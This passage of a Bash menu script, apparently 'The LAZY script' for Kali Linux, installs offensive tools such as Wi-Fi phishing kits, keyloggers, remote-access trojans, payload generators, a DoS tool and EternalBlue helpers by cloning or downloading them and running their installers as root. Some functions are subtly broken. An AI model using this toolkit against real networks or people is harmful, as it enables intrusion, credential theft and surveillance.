			echo -e ""$RS"Anonsurf is not installed.type '"$CE""$YS"install"$CE""$RS"' to install it."
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_anonsurf
			fi
		else
			echo -e "Restarting anonsurf..."
			anonym8 change
			echo -e "Done."
		fi
	elif [[ "$YORNAA" = "7" ]]
	then
		public_ip
	elif [[ "$YORNAA" = "8" ]]
	then
		interface_selection
		clear
		echo "Your MACs: "
		macchanger -s $MYINT
	elif [[ "$YORNAA" = "10" || "$YORNAA" = "11" || "$YORNAA" = "12" ]]
	then
		new_terminal
	elif [[ "$YORNAA" = "13" ]]
	then
		mitm_menu
	elif [[ "$YORNAA" = "14" ]]
	then
		metasploit_menu
	elif [[ "$YORNAA" = "exit" ]]
	then
		kill -9 $PPID
		exit
	elif [[ "$YORNAA" = "update" ]]
	then
		printf '\033]2;UPDATE\a'
		clear
		update_lscript
	elif [[ "$YORNAA" = "if" ]]
	then
		ifconfig
	elif [[ "$YORNAA" = "changelog" ]]
	then
		clear
		BACKL=1
		cat "$LPATH"/Changelog
		echo -e "$PAKTC"
		$READAK
		clear
	elif [[ "$YORNAA" = "" ]]
	then
		clear
		exec bash "$0"
	elif [[ "$YORNAA" = "errors" ]]
	then
		errors_menu
	elif [[ "$YORNAA" = "etercheck" ]]
	then
		if [[ -d /root/wifiphisher ]]
		then
			eternalblue_check
		else
			echo -e ""$RS"Wifiphisher is not installed.Type '"$CE""$YS"install"$CE""$RS"' to install it."$CE""
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_wifiphisher
			fi
		fi
	elif [[ "$YORNAA" = "eternalblue" ]]
	then
		if [[ -d /root/wifiphisher ]]
		then
			eternalblue
		else
			echo -e ""$RS"Wifiphisher is not installed.Type '"$CE""$YS"install"$CE""$RS"' to install it."$CE""
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_wifiphisher
			fi
		fi
	elif [[ "$YORNAA" = "wififb" ]]
	then
		if [[ -d /root/wifiphisher ]]
		then
			wififb
		else
			echo -e ""$RS"Wifiphisher is not installed.Type '"$CE""$YS"install"$CE""$RS"' to install it."$CE""
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_wifiphisher
			fi
		fi
	elif [[ "$YORNAA" = "start" ]]
	then		
		start_menu
#----------
	elif [[ "$YORNAA" = "stop" ]]
	then
		stop_menu
	elif [[ "$YORNAA" = "exit" ]]
	then
		clear
		exit
	fi
####check if it is ks
var1=1
check_if_ks
####
}
#----------------TOOLS---------------
	function install_fluxion
	{
		if [[ -d "/root/fluxion" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/fluxion
		fi
		echo -e "Installing fluxion"
		echo -e "Tool by Deltaxflux"
		sleep 1
		cd
		wget https://fluxion.tk/fluxion-unstable.zip
		apt-get install unzip
		clear
		unzip /root/fluxion*.zip -d /root
		cd /root/fluxion/install
		chmod +x install.sh
		./install.sh	
	}
	function install_wifite
	{
	apt-get install wifite
	}
	function install_wifiphisher
	{
		if [[ -d "/root/wifiphisher" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/wifiphisher
		fi
		echo -e "Installing Wifiphisher"
		echo -e "Tool idea by Dan McInerney"
		sleep 1
		cd
		git clone https://github.com/wifiphisher/wifiphisher.git
		cd wifiphisher
		sudo python setup.py install
		sleep 1
	}
	function install_zatacker
	{
		echo -e "I cannot install Zatacker. Please google how to do that yourself."
		echo -e "PAKTGB"
		read
	}
	function install_morpheus
	{
		if [[ -d "/root/morpheus" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/morpheus
		fi				
		echo -e "Installing Morpheus"
		echo -e "Tool by Pedro ubuntu  [ r00t-3xp10it ]"
		sleep 1
		cd
		git clone https://github.com/r00t-3xp10it/morpheus.git
		cd morpheus
		chmod +x morpheus.sh
	}
	function install_osrframework
	{
		pip install osrframework
	}
	function install_hakku
	{
		if [[ -d "/root/hakkuframework" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/hakkuframework
		fi		
		echo -e "Installing Hakku"
		echo -e "Tool by 4shadoww"
		sleep 1
		cd
		git clone https://github.com/4shadoww/hakkuframework.git
		cd hakkuframework
		chmod +x hakku
		chmod +x install
	}
	function install_trity
	{
		if [[ -d "/root/Trity" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/Trity
		fi		
		echo -e "Installing Trity"
		echo -e "Tool by Toxic-ig"
		sleep 1
		git clone https://github.com/toxic-ig/Trity.git
		cd Trity
		sudo python install.py	
	}
	function install_cupp
	{
		if [[ -d "/root/cupp" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/cupp
		fi			
		echo -e "Installing Cupp"
		echo -e "Tool by Muris Kurgas"
		sleep 1
		cd
		git clone https://github.com/Mebus/cupp.git
		cd cupp
		chmod +x cupp.py	
	}
	function install_dracnmap
	{
		if [[ -d "/root/Dracnmap" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/Dracnmap
		fi			
		echo -e "Installing Dracnmap"
		echo -e "Tool by Edo -maland-"
		cd
		git clone https://github.com/Screetsec/Dracnmap.git
		cd Dracnmap
		chmod +x Dracnmap.sh
	}
	function install_fern
	{
		if [[ -d "/root/Fern-Wifi-Cracker" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/Fern-Wifi-Cracker
		fi		
		echo -e "Installing Fern"
		echo -e "Tool by Savio-code"
		sleep 1
		cd 
		svn checkout http://github.com/savio-code/fern-wifi-cracker/trunk/Fern-Wifi-Cracker/
		cd Fern-Wifi-Cracker
		chmod +x execute.py	
	}
	function install_kickthemout
	{
		if [[ -d "/root/kickthemout" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/kickthemout
		fi		
		echo -e "Installing Kichthemout"
		echo -e "Tool by Nikolaos Kamarinakis & David Schütz"
		sleep 2
		apt-get install nmap
		git clone https://github.com/k4m4/kickthemout.git
		cd kickthemout/
		sudo python -m pip install -r requirements.txt
	}
	function install_ghostphisher
	{
		if [[ -d "/root/ghost-phisher" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/ghost-phisher
		fi			
		echo -e "Installing Ghost-Phisher"
		echo -e "Tool by Savio-code"
		sleep 1
		cd
		git clone https://github.com/savio-code/ghost-phisher.git
		sleep 1
		chmod +x /root/ghost-phisher/Ghost-Phisher/ghost.py
	}
	function install_theeye
	{
		if [[ -d "/root/The-Eye" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/The-Eye
		fi			
		echo -e "Installing The Eye"
		echo -e "Tool by EgeBalci"
		sleep 1
		cd
		git clone https://github.com/EgeBalci/The-Eye.git
		cd The-Eye
		chmod +x TheEye	
	}
	function install_xerxes
	{
		if [[ -d "/root/xerxes" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/xerxes
		fi			
		echo -e "Installing Xerxes"
		echo -e "Tool by zanyarjamal"
		cd
		git clone https://github.com/zanyarjamal/xerxes
		cd xerxes
		gcc xerxes.c -o xerxes	
	}
	function install_mdk3
	{
		if [[ -d "/root/mdk3-master" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/mdk3-master
		fi				
		echo -e "Installing Mdk3-master"
		echo -e "Tool by Musket Developer"
		cd
		git clone https://github.com/wi-fi-analyzer/mdk3-master.git
		cd /root/mdk3-master
		make
		make install
	}
	function install_katana
	{
		if [[ -d "/root/KatanaFramework" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/KatanaFramework
		fi				
		echo -e "Installing Katana framework"
		echo -e "Tool by PowerScript"
		cd
		git clone https://github.com/PowerScript/KatanaFramework.git
		cd KatanaFramework
		sh dependencies
		python install
	}
	function install_airgeddon
	{
		if [[ -d "/root/airgeddon" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/airgeddon
		fi
		echo -e "Installing..."
		sleep 1
		echo -e "Installing Airgeddon"
		echo -e "Tool by v1s1t0r1sh3r3"
		cd
		git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git
		cd airgeddon
		chmod +x airgeddon.sh
	}
	function install_4nonimizer
	{
		if [[ -d "/root/4nonimizer" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/4nonimizer
		fi		
		echo -e "Installing 4nonimizer"
		echo -e "Tool by Hackplayers"
		cd
		git clone https://github.com/Hackplayers/4nonimizer.git
		cd 4nonimizer
		chmod +x 4nonimizer
		./4nonimizer install
		clear
		cd
		apt-get install python-pip
		apt-get install php-curl
		gem install pcaprub
		gem install packetfu	
	}
	function install_beelogger
	{
		if [[ -d "/root/BeeLogger" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/BeeLogger
		fi	
		echo -e "Installing BeeLogger"
		echo -e "Tool by Alisson Moretto - 4w4k3"
		cd
		git clone https://github.com/4w4k3/BeeLogger.git
		cd BeeLogger
		chmod +x install.sh
		./install.sh
		cd
		apt-get install python-pip
		apt-get install php-curl
		gem install pcaprub
		gem install packetfu
		clear
	}
	function install_ezsploit
	{
		if [[ -d "/root/ezsploit" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/ezsploit
		fi				
		echo -e "Installing Ezsploit"
		echo -e "Tool by rand0m1ze"
		git clone https://github.com/rand0m1ze/ezsploit.git
		cd ezsploit/
		chmod +x ezsploit.sh
	}
	function install_pupy
	{
		if [[ -d "/root/pupy" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/pupy
		fi			
		echo -e "Installing Pupy"
		echo -e "Tool by n1nj4sec"
		cd
		git clone https://github.com/n1nj4sec/pupy.git
		cd /root/pupy
		git submodule init
		git submodule update
		cd /root/pupy/pupy
		pip install -r requirements.txt
		cd
	}
	function install_zirikatu
	{
		if [[ -d "/root/zirikatu" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/zirikatu
		fi		
		echo -e "Installing Zirikatu"
		echo -e "Tool by pasahitz"
		cd
		git clone https://github.com/pasahitz/zirikatu.git
		cd zirikatu
		chmod +x zirikatu.sh
	}
	function install_wifiautopwner
	{
		if [[ -d "/root/WiFi-autopwner" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/WiFi-autopwner
		fi		
		echo -e "Installing WiFi-autopwner"
		echo -e "Tool by Mi-Al"
		cd
		git clone https://github.com/Mi-Al/WiFi-autopwner.git
	}
	function install_bully
	{
		if [[ -d "/root/bully" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/bully
		fi				
		echo -e "Installing Bully"
		echo -e "Tool by Aanarchyy"
		cd
		git clone https://github.com/aanarchyy/bully.git
		cd /root/bully/src
		make
		sudo make install	
		cd	
	}
	function install_anonsurf
	{
		if [[ -d "/root/kali-anonsurf" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/kali-anonsurf
		fi		
		cd
		echo -e "Installing Anonsurf"
		echo -e "Tool by Und3rf10w"
		git clone https://github.com/Und3rf10w/kali-anonsurf.git
		cd kali-anonsurf
		chmod +x installer.sh
		./installer.sh
		sleep 1
		cd
	}
	function install_anonym8
	{
		if [[ -d "/root/anonym8" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/anonym8
		fi		
		echo -e "Installing Anonym8"
		echo -e "Tool by HiroshiManRise"
		git clone https://github.com/HiroshiManRise/anonym8.git
		cd anonym8
		chmod +x INSTALL.sh
		./INSTALL.sh
		sleep 1	
		cd
	}
	function install_thefatrat
	{
		if [[ -d "/root/TheFatRat" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/TheFatRat
		fi	
		echo -e "Installing TheFatRat"
		echo -e "Tool by Screetsec"
		cd
		git clone https://github.com/Screetsec/TheFatRat.git
		cd TheFatRat
		chmod +x setup.sh && ./setup.sh	
		cd
	}
	function install_angryip
	{
		cd
		if [[ -f "/root/ipscan_*" ]]
		then
			echo -e "Removing old file"
			sleep 2
			rm -f /root/ipscan_*
		fi
		echo -e "Downloading angryipscanner"
		sleep 2
		wget https://github.com/angryip/ipscan/releases/download/3.5.1/ipscan_3.5.1_amd64.deb
		echo -e "Installing..."
		dpkg -i ipscan_*
		echo -e "Done"
		sleep 1
	}
	function install_sniper
	{
		if [[ -d /root/Sn1per ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/Sn1per
		fi
		echo -e "Installing Sn1per"
		echo -e "Tool by 1N3"
		cd
		git clone https://github.com/1N3/Sn1per.git
		cd /root/Sn1per
		chmod +x install.sh
		./install.sh
		cd
	}
	function install_recondog
	{
		if [[ -d /root/ReconDog ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/ReconDog
		fi
		cd
		echo -e "Installing ReconDog"
		echo -e "Tool by UltimateHackers"
		git clone https://github.com/UltimateHackers/ReconDog.git
	}
	function install_redhawk
	{
		if [[ -d /root/RED_HAWK ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/RED_HAWK
		fi
		cd
		echo -e "Installing RED HAWK"
		echo -e "Tool by Tuhinshubhra"
		git clone https://github.com/Tuhinshubhra/RED_HAWK.git
	}
	function install_winpayloads
	{
		if [[ -d /root/Winpayloads ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/Winpayloads
		fi
		cd
		echo -e "Installing Winpayloads"
		echo -e "Tool by Nccgroup"
		git clone https://github.com/nccgroup/Winpayloads.git
		cd /root/Winpayloads
		chmod +x setup.sh
		./setup.sh
		cd
	}
	function install_chaos
	{
		apt install golang upx-ucl -y
		cd
		if [[ -d /root/CHAOS ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/CHAOS
		fi
		git clone https://github.com/tiagorlampert/CHAOS.git
	}
	function install_routersploit
	{
		if [[ -d /root/routersploit ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/routersploit
		fi
		cd
		echo -e "Installing routersploit"
		echo -e "Tool by reverse-shell"
		git clone https://github.com/reverse-shell/routersploit
		cd /root/routersploit
		pip install -r requirements.txt
		cd
	}
	function install_infoga
	{
		if [[ -d /root/Infoga ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/Infoga
		fi
		git clone https://github.com/m4ll0k/Infoga.git
		cd /root/Infoga
		pip install -r requirements.txt
		cd
	}
	function install_nwatch
	{
		if [[ -d /root/nWatch ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/nWatch
		fi
		cd
		echo -e "Installing nWatch"
		echo -e "Tool by Suraj"
		git clone https://github.com/suraj-root/nWatch.git
	}
	function install_eternalscanner
	{
		if [[ -d /root/eternal_scanner ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/eternal_scanner
		fi
		cd
		echo -e "Installing eternal_scanner"
		echo -e "Tool by Peterpt"
		git clone https://github.com/peterpt/eternal_scanner.git
		apt-get install masscan metasploit-framework
	}
	function install_eaphammer
	{
		if [[ -d /root/eaphammer ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/eaphammer
		fi
		cd
		echo -e "Installing eaphammer"
		echo -e "Tool by s0lst1c3"
		git clone https://github.com/s0lst1c3/eaphammer
		cd eaphammer
		chmod +x kali-setup
		./kali-setup
		cd
		clear
		apt-get install python-tqdm
	}
	function install_dagon
	{
		if [[ -d /root/dagon ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/dagon
		fi
		cd
		echo -e "Installing Dagon"
		echo -e "Tool by Ekultek"
		git clone https://github.com/ekultek/dagon.git
		cd dagon
		pip install -r requirements.txt
		pip2.7 install -r requirements.txt
		apt-get install bcrypt
		cd
	}
	function install_lalin
	{
		if [[ -d /root/LALIN ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/LALIN
		fi
		cd
		echo -e "Installing Lalin"
		echo -e "Tool by Edo -maland-"
		git clone https://github.com/Screetsec/LALIN.git
		cd LALIN
		chmod +x Lalin.sh
		cd
	}
	function install_knockmail
	{
		if [[ -d /root/KnockMail ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/KnockMail
		fi
		cd
		echo -e "Installing KnockMail"
		echo -e "Tool by 4w4k3"
		git clone https://github.com/4w4k3/KnockMail.git
		cd KnockMail
		pip install -r requeriments.txt
		cd
	}
	function install_kwetza
	{
		if [[ -d /root/kwetza ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/kwetza
		fi
		cd
		echo -e "Installing Kwetza"
		echo -e "Tool by Sensepost"
		https://github.com/sensepost/kwetza.git
		pip install beautifulsoup4
		pip2.7 install beautifulsoup4
	}
	function install_ngrok
	{
		if [[ -f /root/ngrok ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm /root/ngrok
		fi
		rm -f /root/ngrok.zip
		cd
		echo -e "Downloading Ngrok"
		wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip --output-document=/root/ngrok.zip
		echo -e "Unzipping Ngrok"
		unzip /root/ngrok.zip
	}
	function install_netdiscover
	{
		apt-get install netdiscover	
	}
	function install_websploit
	{
		apt-get install websploit
	}
	function install_openvas
	{
		apt-get install openvas
		openvas-setup
	}
	function install_shellter
	{
		apt-get install shellter
		sleep 2
	}
	function install_geany
	{
		apt-get install geany
	}
	
#------------------------------------
####################################
defaults_l
printf '\033]2;The LAZY script\a'
if [[ "$ONETIMEPERLAUNCH" != "1" ]]
then
	one_time_per_launch_ks
fi
####################################
if [[ -f ""$LPATH"/IAGREE.txt" ]]
then

	if [[ ! -f ""$LPATH"/wlan.txt" ]]
	then
		set_interface_number
	fi
	clear
	WLANNM=$(cat "$LPATH"/wlanmon.txt)
	WLANN=$(cat "$LPATH"/wlan.txt)
	export WLANNM
	export WLANN
	managed_spaces
	monitor_spaces
	banner
	main_options
	if [[ "$BACKL" = "1" ]]
	then
		exec bash "$0"
		
	else
		echo -e "$PAKTGB"
		$READAK
		exec bash "$0"
	fi
else
	terms_of_use
fi
